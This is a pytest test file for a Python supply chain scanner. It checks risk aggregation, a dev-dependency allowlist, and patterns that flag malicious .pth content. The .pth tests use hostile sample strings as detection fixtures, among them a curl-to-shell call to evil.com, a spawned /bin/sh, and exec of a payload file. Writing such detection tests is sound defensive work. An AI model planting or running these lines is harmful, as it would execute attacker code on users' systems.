"""
Tests for the supply chain integrity scanner (src/supply_chain_scanner.py).

Covers:
  - Phantom dependency detection logic
  - .pth file detection (malicious patterns)
  - Install script detection
  - pip-audit / npm audit output parsing
  - SupplyChainResult risk aggregation
  - PHANTOM_ALLOWLIST behavior
"""

import json
import os
import re
import tempfile

import pytest
from unittest.mock import patch, MagicMock

from src.supply_chain_scanner import (
    PHANTOM_ALLOWLIST,
    SupplyChainFinding,
    SupplyChainResult,
    _PTH_DANGEROUS_PATTERNS,
)


# ============================================================================
# SupplyChainResult risk aggregation
# ============================================================================

class TestSupplyChainResult:

    def test_empty_result_is_safe(self):
        result = SupplyChainResult()
        assert result.overall_risk == "SAFE"
        assert len(result.findings) == 0

    def test_critical_finding_sets_critical(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="test_check", severity="CRITICAL",
            package_name="evil-pkg", ecosystem="python",
            description="Test", evidence="test", recommendation="Remove it"
        ))
        assert result.overall_risk == "CRITICAL"

    def test_high_finding_sets_high(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="test_check", severity="HIGH",
            package_name="risky-pkg", ecosystem="python",
            description="Test", evidence="test", recommendation="Review"
        ))
        assert result.overall_risk == "HIGH"

    def test_mixed_severities_use_highest(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="check1", severity="LOW",
            package_name="pkg1", ecosystem="python",
            description="Low", evidence="", recommendation=""
        ))
        result.add_finding(SupplyChainFinding(
            check_name="check2", severity="HIGH",
            package_name="pkg2", ecosystem="python",
            description="High", evidence="", recommendation=""
        ))
        assert result.overall_risk == "HIGH"

    def test_medium_finding(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="check1", severity="MEDIUM",
            package_name="pkg1", ecosystem="python",
            description="Med", evidence="", recommendation=""
        ))
        assert result.overall_risk == "MEDIUM"

    def test_low_finding(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="check1", severity="LOW",
            package_name="pkg1", ecosystem="python",
            description="Low", evidence="", recommendation=""
        ))
        assert result.overall_risk == "LOW"

    def test_info_finding_stays_safe(self):
        result = SupplyChainResult()
        result.add_finding(SupplyChainFinding(
            check_name="check1", severity="INFO",
            package_name="pkg1", ecosystem="python",
            description="Info only", evidence="", recommendation=""
        ))
        assert result.overall_risk == "SAFE"


# ============================================================================
# .pth dangerous pattern detection
# ============================================================================

class TestPthPatterns:

    def test_import_statement_detected(self):
        content = "import os; os.system('whoami')"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_exec_detected(self):
        content = "exec(open('/tmp/payload.py').read())"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_eval_detected(self):
        content = "eval(compile(code, '<string>', 'exec'))"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_subprocess_detected(self):
        content = "subprocess.Popen(['/bin/sh'])"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_os_system_detected(self):
        content = "os.system('curl http://evil.com | sh')"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_base64_decode_detected(self):
        content = "base64.b64decode(payload)"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_dunder_import_detected(self):
        content = "__import__('os').system('id')"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is True

    def test_safe_path_not_flagged(self):
        content = "/usr/lib/python3.11/site-packages/my_package"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is False

    def test_empty_pth_not_flagged(self):
        content = ""
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is False

    def test_comment_only_pth_not_flagged(self):
        content = "# This is a comment\n/some/path\n"
        matches = any(p.search(content) for p in _PTH_DANGEROUS_PATTERNS)
        assert matches is False


# ============================================================================
# PHANTOM_ALLOWLIST
# ============================================================================

class TestPhantomAllowlist:

    def test_common_devdeps_in_allowlist(self):
        expected = ["pytest", "eslint", "webpack", "jest", "mypy", "black"]
        for pkg in expected:
            assert pkg in PHANTOM_ALLOWLIST, f"{pkg} should be in PHANTOM_ALLOWLIST"

    def test_real_packages_not_in_allowlist(self):
        not_expected = ["requests", "flask", "express", "react", "numpy"]
        for pkg in not_expected:
            assert pkg not in PHANTOM_ALLOWLIST, f"{pkg} should NOT be in PHANTOM_ALLOWLIST"


# ============================================================================
# SupplyChainFinding dataclass
# ============================================================================

class TestSupplyChainFinding:

    def test_finding_fields(self):
        f = SupplyChainFinding(
            check_name="phantom_dependency",
            severity="HIGH",
            package_name="evil-axios",
            ecosystem="javascript",
            description="Package not imported in source",
            evidence="Found in lockfile but not in imports",
            recommendation="Remove from dependencies",
        )
        assert f.check_name == "phantom_dependency"
        assert f.severity == "HIGH"
        assert f.package_name == "evil-axios"
        assert f.ecosystem == "javascript"
